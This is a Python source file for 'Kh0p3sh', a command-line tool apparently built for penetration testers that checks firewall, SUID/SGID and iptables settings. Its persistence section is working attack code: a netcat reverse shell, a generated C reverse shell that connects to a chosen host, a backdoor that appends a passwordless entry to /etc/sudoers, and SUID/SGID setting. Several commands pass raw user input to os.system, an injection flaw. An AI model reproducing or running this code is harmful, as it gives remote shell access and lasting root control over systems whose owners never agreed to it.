from func import *
import getpass
import os

user = getpass.getuser()

print('''
==========================================================
  _  ___      ___       ____      _     
 | |/ / |    / _ \     |___ \    | |    
 | ' /| |__ | | | |_ __  __) |___| |__  
 |  < | '_ \| | | | '_ \|__ </ __| '_ \ 
 | . \| | | | |_| | |_) |__) \__ \ | | |
 |_|\_\_| |_|\___/| .__/____/|___/_| |_|
                  | |                   
                  |_|                   
==========================================================
Developed By Akshay Rohatgi [2020]
    ''')

print('Welcome to Kh0p3sh, a commandline tool built for penetration testers.')
print('======================================================================')

print('For best results run this script as sudo or a binary/service with high level permissions.')
print('\n')

print('Kh0p3sh Console:')
print('For list of commands type help')

while True:
    command = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m>')
#################START OF NEUTRAL COMMANDS##################
    if str(command) == 'help':
        print('''
    
    ==================
    Available Commands
    ==================

    ==============================================
    Neutral Commands
    ----------------------------------------------
    help - shows available commands and their uses
    exit - will exit out of the Kh0p3sh Console
    hax0r - give you encouraging thoughts!
    ==============================================

    ==============================================
    Vulnerability Assessment Commands
    ----------------------------------------------
    ufw - will check if ufw is installed is up
    findSUID - will list all SUID files found
    findSGID - will list all SGID files found
    getRules - will list all iptables rules
    memCheck - will check for any memory security measures in place (useful for pwning or privilege escalation)
    ==============================================

    ==============================================
    Persistence Commands
    ----------------------------------------------
    back - will ask you what kind if backdoor you would like to setup and will attempt to set one up
    createSUID - will attempt to create a file with SUID privileges
    createSGID - will attempt to create a file with SGID privileges
    ==============================================    
        ''')

    elif str(command) == 'exit':
        print('Goodbye!')
        break
    elif str(command) == 'hax0r':
        print('you are a hax0r')
#################END OF NEUTRAL COMMANDS##################

#################START OF VULN ASSESSMENT COMMANDS##################
    elif str(command) == 'ufw':
        if ufw_check() == True:
            print('The \033[1;31;40mUncomplicated Firewall\033[0m IS enabled')
        else:
            print('The \033[1;31;40mUncomplicated Firewall\033[0m IS NOT enabled')

    elif str(command) == 'findSUID':
        if suid_check() == False:
            print('No files with \033[1;31;40mSUID\033[0m permissions found')
        else:
            print('============Finding ALL files with SUID permissions set============')
            print(suid_check())
            print('======================================================')

    elif str(command) == 'findSGID':
        if suid_check() == False:
            print('No files with \033[1;31;40mSGID\033[0m permissions found')
        else:
            print('============Finding ALL files with SGID permissions set============')
            print(sgid_check())
            print('======================================================')

    elif str(command) == 'getRules':
        if suid_check() == False:
            print('No IPtables rules found')
        else:
            print('============Listing ALL iptables rules============')
            print(rules_check())
            print('======================================================')

    elif str(command) == 'memCheck':
        check = mem_check()
        if check == False:
            print('There was an error checking for memory security measures')
        else:
            for message in check:
                print(message)
#################END OF VULN ASSESSMENT COMMANDS##################

#################START OF PERSISTENCE COMMANDS##################

    elif str(command) == 'createSUID':
        print('please enter in the path of the file you want to set SUID on')
        suidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'suid-console\033[0m' '>')
        if len(suidCommand) > 0:
            try:
                if os.path.exists(suidCommand):
                    os.system('chmod u+s ' + suidCommand)
                    print('SUID set!')
                else: print('The file does not exist!')
            except: print('there was an error trying to set the file with SUID permissions!')
        else:
            print('you have to enter something!')

    elif str(command) == 'createSGID':
        print('please enter in the path of the file you want to set SGID on')
        sgidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'sgid-console\033[0m' '>')
        if len(sgidCommand) > 0:
            try:
                if os.path.exists(sgidCommand):
                    os.system('chmod g+s ' + sgidCommand)
                    print('SGID set!')
                else: print('The file does not exist!')
            except: print('there was an error trying to set the file with SGID permissions!')
        else:
            print('you have to enter something!')

    elif str(command) == 'back':
        print('''
Backdoor Commands:

return - to return to the normal program
reverse - to be launched into the reverse shell setup
listen - to launch a netcat listener
sudo - to infect the sudoers file 

        ''')

        backCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' '>')
        
        if str(backCommand) == 'return':
            print('returning you to the normal shell!')
        
        if str(backCommand) == 'reverse':
            print('''
Welcome to the reverse shell console!

nc {ip} {port} - will attempt to setup a reverse netcat shell on that specific port
C {ip} {port} - will attempt to setup a reverse C shell on that specific port

            ''')
            revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
            revCommand = str(revCommand).split()
            if len(revCommand) < 3:
                print('you do not have enough arguments!')
                revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
                revCommand = str(revCommand).split()
            if revCommand[0] == 'nc':
                print('Attempting to create netcat reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
                os.system('nc -e /bin/sh {} {}'.format(revCommand[1], revCommand[2]))
            if revCommand[0] == 'C':
                print('Attempting to create C reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
                os.system('rm -rf back.c && touch back.c')
                fle = open('back.c', 'w')
                fle.write('''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>


int main(void){
                ''')
                fle.write('    int port = {};'.format(revCommand[2]))
                fle.write(
'''
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
''')
                fle.write('''   revsockaddr.sin_addr.s_addr = inet_addr("{}");'''.format(revCommand[1]))
                fle.write('''

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}               
''')
                fle.close()
                os.system('gcc back.c --output shl && ./shl')
        if str(backCommand) == 'sudo':
            print('What user would you like to have sudo privileges?')
            sudoCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'sudo\033[0m' + '>')
            try:
                os.system('echo "' + sudoCommand + ' ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
            except: print('There was an error attempting to create a sudoers backdoor!')
        if str(backCommand) == 'listen':
            print('What port?')
            lisCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'listen\033[0m' + '>')
            os.system('nc -lnvp ' + lisCommand)
#################END OF PERSISTENCE COMMANDS##################

    else:
        print('Command does not exist! try the "help" command')